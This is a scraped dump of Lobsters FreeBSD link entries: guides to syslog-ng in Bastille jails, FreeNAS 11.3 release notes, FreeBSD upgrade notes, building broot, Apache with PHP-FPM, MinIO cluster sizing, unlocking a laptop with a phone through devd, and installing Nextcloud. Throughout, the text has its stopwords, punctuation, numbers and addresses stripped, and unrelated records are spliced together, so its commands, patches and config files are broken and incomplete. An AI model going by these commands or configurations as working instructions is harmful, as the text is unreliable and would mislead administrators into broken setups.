bastille restart alcatraz almost one thing still missing firewall configuration linux container tool automagically extra work needed using bastillebsd container using ip address internal network want send log message port container another host need forward connection public ip address host internal ip container open etcpfconf favorite text editor add line like commentedout example rdr pas inet proto tcp port port specified syslogng configuration ip address used started container change used different value earlier saved reload pf configuration service pf restart testing likely due pf configuration test syslogng container host running bastillebsd get connection refused try connect port public ip address host need use second host testing syslog ng running use loggen telnet test syslogng bastillebsd case ip address host running bastillebsd testing used telnet enter random text hit enter repeat couple time connected escape character test another one close connection check log see something similar usrlocalbastillejailsalcatrazrootvarlogmessages root tail usrlocalbastillejailsalcatrazrootvarlogmessages jan alcatraz syslogng syslog connection accepted clientafinet localafinet jan test jan another one next ready first version blog sent christer edward author bastillebsd review within hour received useful feedback feedback also prepared template making task lot easier getting started guide includes section networking method described involves private ip address port forwarding quite complex hand work everywhere require additional external ip address host easier method well using ip alias host learn documentation http docsbastillebsdorgenlatestchaptersnetworkinghtml come testing blog always focus functional testing syslogng way test troubleshoot freshly created container root bastille cmd alcatraz sockstat alcatraz user command pid fd proto local address foreign address root syslogng root syslogng root bastille cmd alcatraz p auxw alcatraz user pid cpu mem vsz r tt stat started time command root ij usrlocalsbinsyslogng p varrunsyslogpid root isj usrlocalsbinsyslogng p varrunsyslogpid root isj usrsbincron j root rj p auxw previous two example ran troubleshooting tool container called alcatraz command line host expect run command using console container might convenient root bastille console alcatraz alcatraz last login fri jan freebsd generic welcome freebsd release note erratum http wwwfreebsdorgreleases security advisory http wwwfreebsdorgsecurity freebsd handbook http wwwfreebsdorghandbook freebsd faq http wwwfreebsdorgfaq question list http listsfreebsdorgmailmanlistinfofreebsdquestions freebsd forum http forumsfreebsdorg document installed system usrlocalsharedocfreebsd directory installed later pkg install enfreebsddoc language replace en language code like de fr show version freebsd installed freebsdversion uname please include output error message posting question introduction manual page man man freebsd directory layout man hier edit etcmotd change login announcement root alcatraz sockstat user command pid fd proto local address foreign address root syslogng root syslogng using bastillebsd template mentioned earlier based original version blog christer edward prepared syslogng template bastillebsd http gitlabcombastillebsdtemplatessyslogng mean instead building syslogng container ground easily use template first create new container configure firewall necessary start mentioned earlier work running container next download syslogng template bastille bootstrap http gitlabcombastillebsdtemplatessyslogng apply freshly created started container replace target name container bastille template target bastillebsdtemplatessyslogng able test syslogng way described question comment related syslogng hesitate contact u reach u email even chat u list possibility check github page community section http githubcomsyslogngsyslogng twitter available pczanik
179,Lobsters,freebsd,FreeBSD,FreeNAS 11.3-RC2 Available,https://www.ixsystems.com/blog/library/freenas-11-3-rc2/,freenas available,please read release note thoroughly updating http jiraixsystemscomprojectsnas http wwwfreenasorgdownload major new feature improvement community plugins greatly improved updating migrating existing domain controller known impact full feature note automatic certificate management environment acme amazon route new feature deprecated removed feature truecommand migrating existing domain controller known issue known impact backblaze lifecycle rule migrating existing domain controller instruction transfer fsmo role demote,pleased announce general availability freenas series represents yearlong development testing effort departure previous prerelease cycle release candidate fully vetted ixsystems qa team internally user notice significant improvement stability usability please read release note thoroughly updating become familiar potential impact many new feature brought update please report bug http jiraixsystemscomprojectsnas install release refer http wwwfreenasorgdownload installation instruction download installation file major new feature improvement freenas includes many new feature improvement following highlight reimplemented replication engine allows higher speed transfer resume support failed transfer well ability replicate locally acl manager allows setup management smb acl directly via freenas web interface smb shadow copy enabled default new share note snapshot show window previous version tab snapshot used size show change file repository community plugins created user create distribute party plugins officially ixsystems supported updated translation czech french japanese russian simplified chinese additionally process add additional translation greatly improved iscsi wizard streamlines process creating new iscsi target click alert system overhaul granular alert well control set alert threshold dashboard update initial dashboard show live view system status including network traffic cpu memory utilization nat support plugins eliminates need plugin dedicated ip address network full featured api includes rest websocket connection allowing freenas fully scripted driven via api used webinterface large pool creation assistance creating zfs pool large number disk ui provides automated way repeat vdev layout across remaining disk zfs performance optimization across board many different workload updating updating existing freenas system user currently series first update reduce amount migration needed ensure release train correctly updated warden jail exist system take time recreate plugins us iocage backend test working expected freenas system domain controller network follow instruction migrating existing domain controller verify domain working correctly backup configuration using system general save config sure select export password secret seed configured iscsi active directory cloud service replication configured also backup usrlocaletcssh rootssh directory select train dropdown train menu recommended also doublecheck known impact section postinstallation instruction particularly smb share time machine backup note upgrading need select correct train applying update full feature note replication framework redesigned adding new backend system file screen option replication system periodic snapshot task redesign add feature new peerscredentials api creating managing credential ssh connection ssh keypairs screen added wizard make easy generate new keypairs existing sftp ssh replication key created earlier automatically added entry ssh keypairs upgrade new transport api add netcat support greatly improved speed transfer snapshot creation decoupled replication task allowing replication manually created snapshot ability use custom name snapshot configurable snapshot retention remote side new replication wizard make easy configure replication scenario including local replication replication system running legacy replication replication resumable failed replication task automatically try resume previous checkpoint task log accessed state column network interface management redesigned streamline management physical virtual interface using one screen vlans laggs classified interface type support bridge interface type added addressing detail physical interface including dhcp displayed readonly interface member lagg applying interface change web interface provides window cancel change revert previous network configuration new mtu field make easier set mtu longer typed auxiliary parameter automatic certificate management environment acme support added acme simplifies process issuing renewing certificate using set dns challenge verify user owner domain new api support addition multiple dns authenticator support amazon route added initial implementation acme dns screen used authenticator configuration add acme certificate option certificate signing request configured freenas automatically renew acme certificate expire alert system improved support oneshot critical alert added alert remain active dismissed user alert setting reorganized alert grouped functionally rather alphabetically peralert severity alert threshold configurable periodic alert script replaced alert framework periodic alert email disabled default previous email alert condition added freenas alert system email alert method configured alert service dashboard rewritten provide overview current state system rather repeat historical data found reporting us middleware handle data collection provide web interface realtime event line chart replaced meter gauge cpu graph consolidated single widget provides average usage perthread statistic temperature usage interface represented separate card per physical nic unless part lagg card pool interface widget feature mobileinspired lateral navigation allowing user drill data without leaving page reporting greatly improved data prepared backend middleware operating system remaining data manipulation done web worker keeping expensive processing main ui threadcontext svgbased charting library replaced gpuaccelerated canvasbased library virtual scroll lazy loading prevent overloading browser eliminate need pager user zoom x axis reset zoom level double click graph display related data support ups nfs statistic added option configuring reporting database moved system reporting screen add ability configure graph age well number point hourly daily weekly monthly yearly graph graph point location reporting database default tmpfs configurable alert database exceeds gib added alert setting web interface received many improvement bug fix usability enhancement include ability move pin copy help text persistent layout customizations customizable column view size unit accept humanized input improved caching browser support improved error message popup dialog help text ix official theme added default new installation nat support added default plugins nat plugin contained network require knowledge physical network work properly remove need manually configure ip address dhcp server running installing plugin virtualized environment nat remove requirement enable promiscuous mode network plugins page streamlined operation performed without go jail page support collection added differentiate ixsystems plugins receive update every week community plugins addition many bug fix improvement iocage plugins backend resulting much better plugins user experience acl manager added storage pool option permission editor redesigned new iscsi wizard make easy configure iscsi share several pool manager improvement label tooltips encryption operation clearer disk type rotation rate manufacturer information make easier differentiate selectable disk creating pool repeat button make easy create large pool using vdev layout series striped mirror support collecting daily anonymous usage statistic added collected nonidentifying data includes hardware information cpu type number size disk configured nic type well indication service type share plugins configured collected data assist determining best focus engineering testing effort collection enabled default optout unset system general usage collection significant improvement smb sharing include zfs user quota support web service discovery support improved directory listing performance newlycreated share middleware websockets rewrite complete remains backwards compatibility deprecated longer available next major release complete list new feature change ui found new feature section guide deprecated removed feature legacy web interface removed longer appears option login screen warden removed along support warden jail plugins installed using freenas earlier netdata removed service due longstanding upstream memory leak truecommand provides similar reporting plus advanced management capability single multiple freenas system free use manage drive builtin docker template removed though docker still deployed linux virtual machine domain controller removed service migrate existing domain controller configuration follow step migrating existing domain controller updating hipchat removed deprecated upstream known issue release note upgrading show wrong link pointing still fixed release known impact system longer allows moving system dataset encrypted pool containing passphrase since directory service smb state information stored system dataset service function correctly system dataset locked otherwise unavailable recommended move system dataset nonencrypted pool encrypted pool containing passphrase syncing bucket delete file bucket even file deleted locally instead file tagged version number moved hidden state automatically delete old unwanted file bucket adjust backblaze lifecycle rule time machine smb share configured using auxiliary parameter backup may fail since middleware performs smb afpovertcp adisk mdns registration smb share auxiliary parameter longer evaluated determine whether advertise time machine resolve remove fruit time machine yes check time machine box smb share run command midclt call mdnsadvertiserestart default mode changed special simple change recommended synchronizes samba default provides better user experience legacy behavior required add following auxiliary parameter smb share modespecial important share mode setting share common caching backend sid id lookup sambaserver rc script broken separate rc script sambarelated service manually invoke script add one prefix rc command samba server onerestart restart desired service directly service winbindd restart legacy ad monitoring replaced following health check hourly clock skew check dc pdc emulator fsmo role test connection netlogon share currently connected dc every minute instantaneous alert winbindd status domain transitioning offline alert automatically cleared domain come back online existing smb share migrated use new libzfsbased shadow copy module default new smb share shadow copy enabled zfs snapshot visible previous version file explorer disable behavior uncheck enable shadow copy checkbox smb share two share type choice dataset creation smb case insensitive dataset filesystem case insensitive case preserving restricted aclmode chmod permitted default restricted acl generic case sensitive dataset passthrough aclmode chmod allowed default acl smb selected share type default acl applied dataset since case sensitivity setting immutable user consider applicationclient requirement prior selecting smb share type migrating existing domain controller freenas system currently configured domain controller dc network follow step transfer domain role separate system running samba act new dc freenas system take snapshot dataset containing sysvol share make clone current boot environment install samba new server prepare join existing domain follow instruction set freenas dc nameserver new samba dc join new samba dc existing domain sambatool domain join samdomfun dc u samdomadministrator view location current fsmo role sambatool fsmo show transfer fsmo role freenas samba server sambatool fsmo transfer roleall u samdomadministrator demote freenas sambatool domain demote u samdomadministrator snapshot state disable domain controller service freenas clear dc configuration
180,Lobsters,freebsd,FreeBSD,Upgrading FreeBSD from 11.3 to 12.1,https://blog.bimajority.org/2020/01/13/upgrading-freebsd-from-11-3-to-12-1/,upgrading freebsd,like,something like originally expecting content blog look like process moving freebsd server total local build o packaged base get state reliably usable stuck upgrade oldfashioned way created set note cranking upgrade wanted share since really workspecific process well documented people sort upgrade process year source object tree readonly exported build server nfs cause thing slow etcmakeconf etcsrcconf symbolic link server master copy usrsrc make installworld find configuration parameter system built first phase major version upgrade install new kernel zfs snapshot r tank mount usrsrc mount usrobj cd usrsrc make installkernel shutdown r minor version upgrade would lot simpler boot singleuser get server back network ok boot mount u etcrcdzfs start sysctl etcnetstart usrlocaletcrcdunbound start might stop test ensure etcnetstart actually brought system back full connectivity using carp carp interface unintentionally become nonfunctional carp master whatever service would normally running sticking point build server aaaa record machine connectivity time userland part o upgrade mount usrsrc mount usrobj cd usrsrc etcupdate p much faster use tarball built make installworld etcupdate unset editor probably necessary singleuser etcupdate resolve next clean old crap would lot simpler except make deleteold want delete configuration file actually required package install managed configuration management put usrlocal want hack puppet module figure whether service running package base install etcssh symlink usrlocaletcssh system make deleteold way avoid traversing symlink make checkoldfiles sed e etcntpconfd etcsshd xargs rm v make deleteold say etcntpconf etcssh clean mountd database build server cd umount usrobj umount usrsrc next update boot block server vary lot term device boot drive always use gpt boot metaloader partition typical case mirrored sata newer device may single ssd booting instead gpart bootcode b bootpmbr p bootgptzfsboot gpart bootcode b bootpmbr p bootgptzfsboot next handle package upgrade o upgrade server upgraded latest package build practical noop switching abi abi reality found number thing require manual intervention particular package still installed pkg upgrade f crash manually install rcs package system likely needed server local data still managed local rcs file rcs removed note pkgconf handlercscripts enabled default specific case since still running singleuser important startup script run would start service prematurely pkgstatic install f pkg pkg remove handlercscriptsno pkg upgrade f pkg install rcs pkg query n q fgrep v consider whether outdated package deleted finally minor configuration tweak handle feature introduced suppress misfeatures introduced case may pkg install devcpudata sysctl hwmodel check bootfirmware see appropriate microcode file machine cpu type correct current devcpudata intel processor echo cpumicrocodeload yes bootloaderconf echo cpumicrocodename bootfirmwareintelucodebin bootloaderconf echo etcsysctlconf echo ntpdflags p varrunntpdpid etcrcconf reboot jail process much appropriate destdir chroot flag allow update installed jail jailhost side week go back machine delete snapshot run make deleteoldlibs clean obsolete shared library zpool upgrade enable latest zfs feature would really liked point set zfs boot environment server since actual requirement seem totally undocumented rather stymied year going perhaps packaged base usable state well like like loading related
181,Lobsters,freebsd,FreeBSD,Run broot on FreeBSD,https://vermaden.wordpress.com/2020/01/10/run-broot-on-freebsd/,run broot freebsd,http githubcomcanopbroot build install update patch needed update portspackages like,broot file manager quite fresh nice approach file directory whatever else call messing file broot tool yet available freebsd system package port guide show built install freebsd system look action filter jail filter zfs size mode started option similar ncdu tool also check feature showcase section github page http githubcomcanopbroot available build three step make happen need install rust package pkg install rust need type regular user cargo install broot command cargo install broot fail need apply patch diff u wsypixel let ok true wrapwithresult unsafe ioctl stdoutfileno tiocgwinsz mut size let ok true wrapwithresult unsafe ioctl stdoutfileno tiocgwinszinto mut size ok sizewscol sizewsrow else tputsize okorelse std io error lastoserror type cargo install broot command properly compile cargo install broot updating cratesio index downloaded broot downloaded crate mb installing broot compiling libc compiling cfgif compiling lazystatic compiling autocfg compiling semverparser compiling autocfg compiling compiling log compiling scopeguard compiling unicodexid compiling bitflags compiling syn compiling memchr compiling arcswap compiling slab compiling smallvec compiling serde compiling unicodewidth compiling regexsyntax compiling ansiterm compiling strsim compiling vecmap compiling idarena compiling customerror compiling glob compiling open compiling umask compiling threadlocal compiling minimad compiling lazyregex compiling semver compiling lockapi compiling crossbeamutils compiling crossbeamepoch compiling numtraits compiling numinteger compiling textwrap compiling rustcversion compiling memoffset compiling iovec compiling compiling dirssys compiling parkinglotcore compiling signalhookregistry compiling time compiling atty compiling user compiling quote compiling ahocorasick compiling mio compiling dirs compiling directory compiling parkinglot compiling clap compiling crossbeamqueue compiling crossbeamchannel compiling toml compiling term compiling regex compiling signalhook compiling chrono compiling crossterm compiling simplelog compiling crossbeamdeque compiling thiserrorimpl compiling crossbeam compiling thiserror compiling termimad compiling broot finished release optimized target installing homevermadencargobinbroot installed package broot executable broot warning sure add homevermadencargobin path able run installed binary echo install go cargobin directory copy broot binary place set path variable start new terminal updated path variable type broot command cp cargobinbroot script rehash broot asked automatic setup br function tool place agreed answer thing generated process find configbroot homevermadenconfigbroot homevermadenconfigbrootconftoml homevermadenconfigbrootlauncher homevermadenconfigbrootlauncherbash homevermadenconfigbrootlauncherbashbr find localsharebroot homevermadenlocalsharebroot homevermadenlocalsharebrootlauncher homevermadenlocalsharebrootlauncherfish homevermadenlocalsharebrootlauncherbash use zsh shell also update zshrc file tail zshrc source homevermadenconfigbrootlauncherbashbr finished broot installed ready use update patch needed thanks broot author patch needed build work box update portspackages broot file manager available via usual freebsd port package make guide pointless available miscbroot port eof like like loading related
182,Lobsters,freebsd,FreeBSD,BSD Now 332 - BSD Hyperbole,https://www.bsdnow.tv/332,bsd bsd hyperbole,headline news roundup beastie bit feedbackquestions feedback bsdnowtv,announcing hyperbolabsd ipfw inkernel nat setup freebsd wayland webrtc enabled netbsd lldb threading support ready mainline openssh support base dragonfly update headline due linux kernel rapidly proceeding unstable path planning implementing completely new o derived several bsd implementation easy decision make wish use time resource create viable alternative current operating system trend actively seeking undermine user choice freedom distro hard fork openbsd kernel userspace including new code written replace gplincompatible part nonfree one reason include linux kernel forcing adaption drm including hdcp linux kernel proposed usage rust contains freedom flaw centralized code repository prone cyber attack generally requires internet access use linux kernel written without security mind kspp basically dead project grsec longer free software many gnu userspace core utils forcing adaption feature without build time option disable eg pulseaudio systemd rust java forced dependency continue support milky way branch legacy linuxlibre kernel reach end life future version hyperbola using hyperbolabsd new kernel userspace abi compatible previous version hyperbolabsd intended modular minimalist project able reuse code free license graduating college moving brooklyn ny redmond wa guess got job always wanted redo opnsense firewall currently hp stock freebsd ipfw inkernel nat ipfw benchmark shown ipfw faster especially good tor relay however one downside ipfw le documentation v pf even le without natd using took time figure since already packed testing old pc two nics laptop client usbtoethernet adapter news roundup head wayland option turned default netbsd linux case peacefully coexists right effect following package graphicsmesalib wwwwebkitgtk webrtc option also enabled default netbsd two firefox version wwwfirefox please keep informed fallout hopefully none want try waylandrelated thing netbsd wmveloxmessage may interesting upstream describes lldb next generation highperformance debugger built top llvmclang toolchain feature great integration moment primarily support debugging c c objc code interest extending language february started working lldb contracted netbsd foundation far working reenabling continuous integration squashing bug improving netbsd core file support extending netbsd ptrace interface cover register type fix issue fixing watchpoint support started working improving thread support taking longer expected read september report far number issue uncovered enabling proper threading support stopped merging workinprogress patch however finally reached point believe current work merged remaining problem resolved afterwards llvmrelated event happening last month report hardware backed key generated using sshkeygen ecdsask token support many token require touchedtapped confirm step get publicprivate keypair back usual except case private key file contain highlysensitive private key instead hold key handle used security key derive real private key signing time stealing copy private key file without also stealing security key access give attacker anything update linux broxton valleyview cherryview support improvement broadwell support improvement broadwell brightness fix openbsd atomic modesetting improvement various bug fix performance enhancement beastie bit feedbackquestions send question comment show ideastopics story want mentioned show feedback bsdnowtv browser support video tag
183,Lobsters,freebsd,FreeBSD,Configure Apache HTTP with MPM Event and PHP-FPM on FreeBSD 12.0,https://www.digitalocean.com/community/tutorials/how-to-configure-apache-http-with-mpm-event-and-php-fpm-on-freebsd-12-0,configure apache http mpm event phpfpm freebsd,open internetfree speech fund write donation introduction apache http prefork worker event mpm event phpfpm famp stack prerequisite guide tutorial step changing multiprocessing module note graceful restart step configuring apache http use fastcgi process manager php supported version page step checking configuration fpmfastcgi conclusion documentation,author selected open internetfree speech fund receive donation part write donation program introduction apache http web server evolved year work different environment solve different need one important problem apache http solve like web server handle different process serve http protocol request involves opening socket processing request keeping connection open certain period handling new event occurring connection returning content produced program made particular language php perl python task performed controlled multiprocessing module mpm apache http come three different mpm prefork new process created incoming connection reaching server process isolated others memory shared even performing identical call point execution safe way run application linked library support older application library worker parent process responsible launching pool child process listening new incoming connection others serving requested content process threaded single thread handle one connection one process handle several request concurrently method treating connection encourages better resource utilization still maintaining stability result pool available process often free available thread ready immediately serve new connection event based worker mpm go one step optimizing parent process schedule task child process thread associated connection stay open second default close new event happens keepalive directive default value retains thread associated event mpm enables process manage thread thread free handle new incoming connection others kept bound live connection allowing redistribution assigned task thread make better resource utilization performance mpm event module fast multiprocessing module available apache http web server phpfpm fastcgi process manager php fastcgi protocol based common gateway interface cgi protocol sits application web server like apache http allows developer write application separately behavior web server program run process independently pas product web server protocol new connection need processing application create new process combining mpm event apache http php fastcgi process manager phpfpm website load faster handle concurrent connection using fewer resource tutorial improve performance famp stack changing default multiprocessing module prefork event using phpfpm process manager handle php code instead classic modphp apache http prerequisite begin guide need following freebsd server set following guide famp stack installed server following tutorial access user root privilege allowed using sudo order make configuration change step changing multiprocessing module begin looking prefork directive httpdconf file main configuration file apache http enable disable module edit set directive listening port apache http serve content location content display file make change use nl number line program ba flag count number line nothing mismatched later stage combined grep command first count line file specified path finished search string character looking run following command nl program process number line httpdconf grep process output searching given string character modmpmprefork nl ba grep modmpmprefork output see something similar loadmodule mpmpreforkmodule let edit line text editor tutorial use vi default editor freebsd sudo vi append symbol beginning line line commented like loadmodule mpmpreforkmodule appending symbol disabled prefork mpm module find event directive httpdconf file nl ba grep mpmevent see output similar following output loadmodule mpmeventmodule remove symbol line enable event mpm sudo vi directive read follows loadmodule mpmeventmodule switched configuration mpm prefork event remove package connecting php processor apache http since longer necessary interfere remains system sudo pkg remove make sure configuration correct running following command test sudo apachectl configtest see syntax ok output restart apache http server note running http connection server graceful restart recommended instead regular restart ensure user pushed losing connection switched mpm prefork event removed module connection php apache http next step install phpfpm module configure apache http communicate php quickly step configuring apache http use fastcgi process manager freebsd several supported version php install via package manager freebsd different binary various available version compiled instead using one like gnulinux distribution offer default repository follow best practice use supported version check php supported version page step add phpfpm running service start boot also configure apache http work php adding dedicated configuration module well enabling module httpdconf first append phpfpmenableyes etcrcconf file phpfpm service start using sysrc command sudo sysrc phpfpmenable yes add phpfpm module apache module directory configured used apache http create following file sudo vi add following ifmodule proxyfcgimodule ifmodule dirmodule directoryindex indexphp ifmodule filesmatch phpphtmlinc sethandler proxy fcgi filesmatch ifmodule state module proxyfcgi enabled well dirmodule processed file matching extension parenthesis handled fastcgi process manager running local machine port local machine proxy server phpfpm module apache http interconnect achieve activate module step enable proxy module first search httpdconf file nl ba grep modproxyso see output similar following output loadmodule proxymodule uncomment line removing symbol sudo vi line look follows edited loadmodule proxymodule activate fastcgi module find module following command nl ba grep modproxyfcgiso see something similar following output loadmodule proxyfcgimodule uncomment line already done module sudo vi leave line follows loadmodule proxyfcgimodule done start phpfpm service sudo service phpfpm start restart apache load latest configuration change incorporating php module installed phpfpm module configured apache http work enabled necessary module fastcgi protocol work started corresponding service apache event mpm module enabled phpfpm present running time check everything working intended step checking configuration order check configuration change applied run test first one check multiprocessing module apache http using second verify php using fpm manager check apache http server running following command sudo apachectl grep mpm output follows outputmpmeventmodule shared repeat proxy module fastcgi sudo apachectl grep proxy output show outputproxymodule shared proxyfcgimodule shared would like see entire list module remove second part command time check php using fastcgi process manager write small php script show information related php run following command write file named follows sudo vi add following content infophp file infophp php phpinfo visit server url append infophp end like http yourserveripaddressinfophp server api entry fpmfastcgi remember delete infophp file check information server publicly disclosed sudo rm checked working status mpm module module handling fastcgi handling php code conclusion optimized original famp stack number connection create new apache http process increased phpfpm handle php code efficiently overall resource utilization improved see apache http server project documentation information different module related project
184,Lobsters,freebsd,FreeBSD,Relaxing 32-Node Restriction on MinIO,https://blog.min.io/relaxing-the-32-node-restriction-on-minio/,relaxing restriction minio,cluster node expand existing deployment cloud native infrastructure work minio sizing recommendation relaxing node restriction download,minio previously imposed muchdiscussed per cluster limit lifted december hard technical reason limit use minio create node cluster reason imposed limit drive good architectural decision learned however saw limitation indeed competitor suggested node could scale lifted understand part using open source software fiddling around many moving part possible many user want much flexibility possible even flexibility something recommend nonetheless cluster material benefit architecture perspective wanted use post point timing right look like defending older limit since exist anymorethe reason limit first place encourage good architecture design building node cluster possible mean good idea especially paired kubernetes minio often used developer might experience creating managing storage architecture goal node limit create guardrail user unknowingly creating storage cluster would impossible support longterm node main challenge cluster node supportability large failure domain becomes difficult maintenance activity difficult recover failure next impossible successfully back data node per cluster store lot data cluster capable storing petabyte user need petabyte data act cluster simple create multiple cluster expand existing deployment appropriate number node like providing functionality without violating sizing best practicesthe complexity come managing petabyte single cluster begin get daunting large fault domain server go entire infrastructure go failure support nightmare likely lead data loss let clear failure issue especially dealing large number node smaller node configuration make manageability root cause analysis easier another problem single large fault domain time required back move data data exist vacuum also networking issue consider larger failure domain lower likelihood company network capacity effectively back move data stored extremely large chunk cloud native infrastructure worksthe basic premise cloud native architecture whether compute storage consume resource small discrete chunk scale add additional instance pack densely possible infrastructure instead scaling one instance infinitelyeven public cloud physical limit infrastructure handle bucket api request per hour etc ignoring limit recipe data loss andor downtime nothing magical node found good proxy balancing failure domain scale ignoring recommendation start contradict basic premise running containerized workload application associated storage broken piece small possible minio sizing recommendationsminio sizing recommendation changed since limit restriction removed cluster ideally least node meet redundancy requirement maximum node need additional storage capacity best practice deploy new instance minio scale even cluster node cluster federated together allowing operate one giant cluster scale infinity still keeping architecture manageable architecture le complex manage scale enormous cluster still provides potential limitless scalingrelaxing node restrictionsour growth created unbelievable number configuration use case led community ask relaxation node restriction support specific deployment addition serving distraction often people understand failure domain best practice one beauty open source software people free play around learn hard way feel strongly running storage cluster right production application welcome try likely see problem first try back move data managing maintenance well tell want start experiment minio download
185,Lobsters,freebsd,FreeBSD,Unlock Your UNIX Laptop with Your Phone,https://vermaden.wordpress.com/2020/01/09/freebsd-desktop-part-20-configuration-unlock-your-laptop-with-phone/,unlock unix laptop phone,freebsd desktop global page device detection devd grep linebuffered processing event grep linebuffered device sernum sernum sernum command event implementation cat usrlocaletcdevdphonelockconf match system usb match subsystem device match type detach match vendor match product match sernum update better sniffing better unlock method cat usrlocaletcdevdphonelockconf like,really like smart card ecosystem probably big pita setup subsystem freebsd make lockunlock laptop smart card mention even possible probable lack driver laptop builtin smart card reader mention lock unlock laptop smart card fast way people use finger print reader fast workstationlaptop unlock purpose case scenario smart card time needed setup properly mention fast anyway often see colleague swinging finger fingerprint reader finally work time wan also lock unlock unix laptop phone attaching device freebsd devd subsystem come handy today show lockunlock laptop phone may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content keep mind order make work need attach phone laptop using cable support data transfer work cable provide power charging phone device detection first need detect device lockerunlocker stop devd daemon service devd stop stopping devd waiting pid start foreground debug purpose attach phone command grep help find needed information devd grep linebuffered processing event grep linebuffered device processing event systemusb subsystemdevice typeattach sernum modehost highlited needed information stop process yet know device lockerunlocker even devd daemon get attach phone thing note hare data enough unlock workstation detach phone computer see detach even similar one processing event systemusb subsystemdevice typedetach sernum modehost know event spawned detach phone stop foreground devd daemon start service traditionally devd grep linebuffered processing event grep linebuffered device processing event systemusb subsystemdevice typeattach sernum modehost processing event systemusb subsystemdevice typedetach sernum modehost c service devd start starting devd command event action command executed attach detach phone depends screen locker using setup example use matescreensaver purpose attach event case would kill current process matescreensaver unlock screen start next lock purpose command run attach event pkill matescreensaver su l vermaden c env matescreensaver detach event notifying matescreensaver lock screen command used purpose su l vermaden c env matescreensavercommand lock implementation devd config file phone would look like cat usrlocaletcdevdphonelockconf phone attach unlock notify match system usb match subsystem device match type attach match vendor match product match sernum action pkill matescreensaver su l vermaden c env matescreensaver phone detach lock notify match system usb match subsystem device match type detach match vendor match product match sernum action su l vermaden c env matescreensavercommand lock restart devd daemon read new configuration file service devd restart stopping devd waiting pid starting devd viola lock unlock screen attaching detaching phone fancy video behaves must trust le second lock unlock laptop sure keep additional eye phone unlock access file course use usb device even network action event supported devd daemon course create lockunlock config attachdetach phone additionally configure power action detach usb device forgot mention method disables classic password authentication add automatic screen lockunlock attach phone still login unlock using password matescreensaver lock screen update better devd sniffing better unlock method reddit suggested needed stop devd start debug mode easier attach pipe nc tool nc u varrundevdpipe also need kill matescreensaver command elegant send matescreensavercommand unlock command updated usrlocaletcdevdphonelockconf config file devd daemon cat usrlocaletcdevdphonelockconf phone attach unlock notify match system usb match subsystem device match type attach match vendor match product match sernum action su l vermaden c env matescreensavercommand unlock phone detach lock notify match system usb match subsystem device match type detach match vendor match product match sernum action su l vermaden c env matescreensavercommand lock eof like like loading related
186,Lobsters,freebsd,FreeBSD,Nextcloud 17 on FreeBSD 12.1,https://vermaden.wordpress.com/2020/01/04/nextcloud-17-on-freebsd-12-1/,nextcloud freebsd,nextcloud freebsd nextcloud freebsd phpfpm setting package port postgresql cat etcloginconf postgres setenvlccollatec tcdefault eof capmkdb etcloginconf usrlocaletcrcdpostgresql initdb postgresql cleanup indexing script binsh usrlocalbinvacuumdb az devnull devnull usrlocalbinreindexdb devnull devnull usrlocalbinreindexdb devnull devnull wq nginx openssl http certificate php php postgresql database setting cat postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice eof php fpm start backend service nextcloud configuration http http trusted domain log rotation newsyslog like,long ago almost year wrote setting nextcloud freebsd today nextcloud version configuration worked two year ago requires tweak guide cover information available earlier nextcloud freebsd article like setting run nextcloud inside freebsd jail please refer earpier article setting today use backends nextcloud postgresql php nginx phpfpm memcached nextcloud freebsd package come mysql without postgresql support need build source using freebsd port setting let fetch latest freebsd port tree rm r vardbportsnap mkdir vardbportsnap portsnap auto need configure needed option etcmakeconf file cat etcmakeconf wrkdirprefix portsdir obj defaultversions defaultversions optionsunset mysql optionsset pgsql optionsset imagick optionsset pcntl optionsset smb optionsset redis package port first add basic tool thing like postgresql still using freebsd package save tome time instead compiling pkg install sudo portmaster beadm lsblk nginx memcached compile nextcloud dependency using freebsd port portmaster env batchyes portmaster wwwnextcloud postgresql configure freebsd login class postgresql database etcloginconf file cat etcloginconf postgres setenvlccollatec tcdefault eof capmkdb etcloginconf postgresql setting main freebsd configuration etcrcconf file grep postgresql etcrcconf postgresqlenableyes postgresqlclasspostgres let initialize postgresql database usrlocaletcrcdpostgresql initdb file belonging database system owned user postgres user must also server process database cluster initialized locale collate c ctype message monetary numeric time default text search configuration set english data page checksum disabled fixing permission existing directory ok creating subdirectory ok selecting dynamic shared memory implementation posix selecting default maxconnections selecting default sharedbuffers selecting default time zone europewarsaw creating configuration file ok running bootstrap script ok performing postbootstrap initialization ok syncing data disk ok initdb warning enabling trust authentication local connection change editing pghbaconf using option authlocal authhost next time run initdb success start database server using usrlocalbinpgctl l logfile start postgresql database us block let set zfs could course create dedicated dataset purpose needed zfs set zrootrootdefault let start postgresql database usrlocaletcrcdpostgresql start cet log starting postgresql compiled freebsd clang version based llvm cet log listening address port cet log listening address port cet log listening unix socket cet log ending log output stderr cet hint future log output go log destination syslog create postgresql database nextcloud instance psql hlocalhost upostgres psql type help help postgres create user nextcloud password nextclouddbpassword create role postgres create database nextcloud template encoding unicode create database postgres alter database nextcloud owner nextcloud alter database postgres q keep mind put something sophisticated nextclouddbpassword place postgresql cleanup indexing script let automate postgresql housekeeping mkdir p vardbpostgresbin chown postgres vardbpostgresbin vi vardbpostgresbinvacuumsh binsh usrlocalbinvacuumdb az devnull devnull usrlocalbinreindexdb devnull devnull usrlocalbinreindexdb devnull devnull wq cat vardbpostgresbinvacuumsh binsh usrlocalbinvacuumdb az devnull devnull usrlocalbinreindexdb devnull devnull usrlocalbinreindexdb devnull devnull chown postgres vardbpostgresbinvacuumsh chmod x vardbpostgresbinvacuumsh su postgres c crontab e vardbpostgresbinvacuumsh wq line character crontab installing new crontab su postgres c crontab l vardbpostgresbinvacuumsh su postgres c vardbpostgresbinvacuumsh nginx time nginx webserver chown r www www varlognginx l l varlognginx total rwr www www accesslog rwr www www rwr www www errorlog rwr www www main nginxconf configuration file cat usrlocaletcnginxnginxconf user www workerprocesses workerrlimitnofile errorlog varlognginxerrorlog event workerconnections http include mimetypes defaulttype applicationoctetstream logformat main remoteaddr remoteuser timelocal request accesslog varlognginxaccesslog main sendfile keepalivetimeout upstream phphandler server server enforce http listen servername nextclouddomaincom return http servername requesturi server listen ssl servername nextclouddomaincom sslcertificate usrlocaletcnginxsslsslbundlecrt sslcertificatekey usrlocaletcnginxsslserverkey header security related addheader stricttransportsecurity includesubdomains preload addheader referrerpolicy noreferrer header addheader xcontenttypeoptions nosniff addheader xxssprotection modeblock addheader xrobotstag none addheader xdownloadoptions noopen addheader 